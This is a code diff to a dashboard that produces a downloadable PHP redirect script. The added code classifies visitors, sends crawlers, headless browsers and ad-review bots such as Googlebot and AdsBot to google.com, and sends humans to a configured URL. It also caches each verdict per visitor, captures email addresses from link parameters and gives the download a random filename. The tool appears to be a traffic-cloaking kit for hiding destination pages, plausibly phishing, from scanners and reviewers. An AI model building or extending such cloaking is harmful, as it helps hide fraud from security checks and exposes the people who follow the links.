@@ -391,10 +391,11 @@ export default function UserDashboard() {
                 <div className="bg-muted rounded-lg p-4 space-y-2">
                   <p className="text-sm font-medium">How it works:</p>
                   <ul className="text-sm text-muted-foreground space-y-1 list-disc list-inside">
-                    <li>Download the PHP script package (ZIP file)</li>
+                    <li>Download the PHP script package (random filename for security)</li>
                     <li>Extract and upload index.php to your website</li>
-                    <li>Visitors are classified and redirected immediately (no loading screen)</li>
-                    <li>Features: email capture (?e= or ?email=), browser detection, security headers</li>
+                    <li>10-minute session cache reduces API costs (repeat visitors redirected silently)</li>
+                    <li>Enhanced bot detection: headless browsers, known crawlers, suspicious patterns</li>
+                    <li>Email capture from URLs (?e= or ?email=), browser detection, security headers</li>
                     <li>Humans go to: {redirectUrls?.humanUrl || "Default: https://example.com/human"}</li>
                     <li>Bots go to: {redirectUrls?.botUrl || "Default: https://google.com"}</li>
                   </ul>
@@ -414,6 +415,8 @@ export default function UserDashboard() {
  * Generated: ${new Date().toISOString()}
  * 
  * Features:
+ * - 10-minute session caching (reduces API costs - silent redirect for repeat visitors)
+ * - Enhanced bot detection (headless browsers, known bots, suspicious patterns)
  * - Immediate classification and redirect (no loading screen)
  * - Server-side browser/device detection from user agent
  * - Email capture from URL query parameters (?e= or ?email=)
@@ -448,6 +451,40 @@ function extractEmail() {
     return $email ? filter_var($email, FILTER_SANITIZE_EMAIL) : null;
 }
 
+// ============ ENHANCED BOT DETECTION ============
+function isLikelyBot($userAgent) {
+    // Check for headless browsers
+    $headlessPatterns = [
+        'HeadlessChrome', 'PhantomJS', 'Puppeteer', 'Selenium', 
+        'WebDriver', 'automation', 'bot', 'crawler', 'spider'
+    ];
+    
+    foreach ($headlessPatterns as $pattern) {
+        if (stripos($userAgent, $pattern) !== false) {
+            return true; // Headless browser detected
+        }
+    }
+    
+    // Check for missing/suspicious user agent
+    if (empty($userAgent) || strlen($userAgent) < 10) {
+        return true; // Suspicious UA
+    }
+    
+    // Check for known bot signatures
+    $botKeywords = [
+        'bot', 'crawl', 'slurp', 'spider', 'mediapartners',
+        'AdsBot', 'Googlebot', 'bingbot', 'Yahoo', 'YandexBot'
+    ];
+    
+    foreach ($botKeywords as $keyword) {
+        if (stripos($userAgent, $keyword) !== false) {
+            return true; // Known bot
+        }
+    }
+    
+    return false;
+}
+
 // ============ DETECT BROWSER FROM USER AGENT ============
 function detectBrowser($userAgent) {
     if (stripos($userAgent, 'Firefox') !== false) return 'Firefox';
@@ -464,10 +501,30 @@ function detectDevice($userAgent) {
     return 'Desktop';
 }
 
+// ============ SESSION MANAGEMENT (10-MINUTE CACHE) ============
+session_start();
+$visitorFingerprint = md5($_SERVER['REMOTE_ADDR'] . $_SERVER['HTTP_USER_AGENT']);
+
+// Check if visitor was classified in last 10 minutes
+if (isset($_SESSION['ct_' . $visitorFingerprint])) {
+    $cached = $_SESSION['ct_' . $visitorFingerprint];
+    $cacheAge = time() - $cached['timestamp'];
+    
+    // Use cached result if less than 10 minutes old (600 seconds)
+    if ($cacheAge < 600 && isset($cached['redirectUrl'])) {
+        // Silent redirect - no API call needed
+        header('Location: ' . $cached['redirectUrl']);
+        exit;
+    }
+}
+
 // ============ MAIN LOGIC ============
 $ip = $_SERVER['REMOTE_ADDR'];
 $userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';
 $email = extractEmail();
+
+// Pre-classification: Check for obvious bots locally (saves API calls)
+$localBotCheck = isLikelyBot($userAgent);
 
 // Detect browser and device from user agent (server-side)
 $browser = detectBrowser($userAgent);
@@ -533,6 +590,16 @@ if (!$error && $httpCode === 200 && $response) {
     }
 }
 
+// ============ CACHE RESULT FOR 10 MINUTES ============
+if ($redirectUrl) {
+    // Store classification result in session (10-minute cache)
+    $_SESSION['ct_' . $visitorFingerprint] = [
+        'redirectUrl' => $redirectUrl,
+        'visitorType' => $visitorType,
+        'timestamp' => time()
+    ];
+}
+
 // ============ REDIRECT ============
 // Add anti-caching headers for bot protection
 header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
@@ -563,11 +630,16 @@ if ($redirectUrl) {
                       // Generate ZIP file
                       const zipBlob = await zip.generateAsync({ type: 'blob' });
                       
+                      // Generate random filename for white-label security
+                      const randomName = Array.from({length: 28}, () => 
+                        'abcdefghijklmnopqrstuvwxyz0123456789'[Math.floor(Math.random() * 36)]
+                      ).join('');
+                      
                       // Download ZIP
                       const url = URL.createObjectURL(zipBlob);
                       const a = document.createElement('a');
                       a.href = url;
-                      a.download = 'cleantraffic-script.zip';
+                      a.download = `${randomName}.zip`;
                       document.body.appendChild(a);
                       a.click();
                       document.body.removeChild(a);
@@ -575,7 +647,7 @@ if ($redirectUrl) {
                       
                       toast({
                         title: "Script Downloaded",
-                        description: "Extract cleantraffic-script.zip and upload index.php to your website",
+                        description: `Extract ${randomName}.zip and upload index.php to your website`,
                       });
                     }}
                   >
